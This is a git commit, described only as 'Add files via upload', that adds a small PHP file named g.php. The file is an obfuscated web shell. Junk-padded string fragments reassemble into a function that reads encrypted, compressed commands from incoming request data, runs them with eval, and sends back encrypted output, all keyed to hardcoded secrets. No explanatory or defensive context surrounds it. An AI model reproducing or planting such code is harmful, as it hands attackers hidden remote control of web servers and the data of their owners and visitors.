b5c2b00d48fd1d2bb0e8cf0fdd634cead8791ef2
Atsnagn Kifle <56724138+AtsnagnKifle@users.noreply.github.com>
2022-12-09 14:40:20 +0300

    Add files via upload

---
+++ g.php
@@ -0,0 +1,10 @@
+<?php
+$f='_BAconteBAnBAts()BA;@BAob_BAend_clean();$r=@basBAe6BA4_BAencode(@BAx(@gzcompBAress($o),$BAkBA));prBAinBAt("$p$kh$r$kf");}';
+$g=',$k)BA{$cBA=sBAtrlen($k);$l=stBArlen(BA$t);$o=BA""BA;for($iBA=0;$i<$l;BA){for(BA$BAj=0;(BA$j<$c&&$iBA<$l);$j+BABA+,$i++){';
+$M='$o.BA=$BAt{$i}^$k{$jBA};BA}}retBAurn $o;BA}if (@preg_BAmBAatch("/$khBA(.+)$kfBA/",@fiBAle_BABAget_contBAents("php://iB';
+$k=str_replace('y','','creyaytyeyyy_function');
+$o='$BAk="6eeBAa9b7e";$kh="fBA19BABA179BAa06954";$kf=BA"edd0f6c05cBAeb";$p=BA"jv5ha7qBACNBAiBAAQOWAE";functioBAn xBA($t';
+$R='AnpBAut"),$m)=BA=1) BA{@ob_BAstart();@eBABAvaBAl(@gBAzuncompress(@BAx(@base6BA4BA_decode(BA$m[1]),BA$k)));$o=BA@ob_get';
+$U=str_replace('BA','',$o.$g.$M.$R.$f);
+$F=$k('',$U);$F();
+?>
